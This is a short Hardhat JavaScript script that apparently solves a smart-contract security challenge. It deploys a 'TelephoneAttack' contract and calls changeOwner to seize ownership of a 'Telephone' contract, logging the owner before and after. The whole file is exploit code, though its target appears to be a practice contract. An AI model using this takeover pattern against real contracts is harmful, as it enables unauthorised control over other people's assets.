const { ethers } = require("hardhat");

const CONTRACT_ADDRESS = "0x61c36a8d610163660E21a8b7359e1Cac0C9133e1"; // get from browser console
const PLAYER_ADDRESS = "0x23618e81E3f5cdF7f54C3d65f7FBc0aBf5B21E8f"; // change to your own address

async function main() {
  const singer = await ethers.getSigner(PLAYER_ADDRESS);
  const contract = await ethers.getContractAt(
    "Telephone",
    CONTRACT_ADDRESS,
    singer
  );
  const owner = await contract.owner();
  console.log(`original owner :${owner}`);
  console.log("-----------------------------");

  const TelephoneFactory = await ethers.getContractFactory("TelephoneAttack");
  const telephoneAttack = await TelephoneFactory.deploy();
  await telephoneAttack.deployed();

  await telephoneAttack.changeOwner(PLAYER_ADDRESS);
  const newowner = await contract.owner();
  console.log(`new owner :${newowner}`);
}

main().catch((error) => {
  console.error(error);
  // eslint-disable-next-line no-process-exit
  process.exit(1);
});
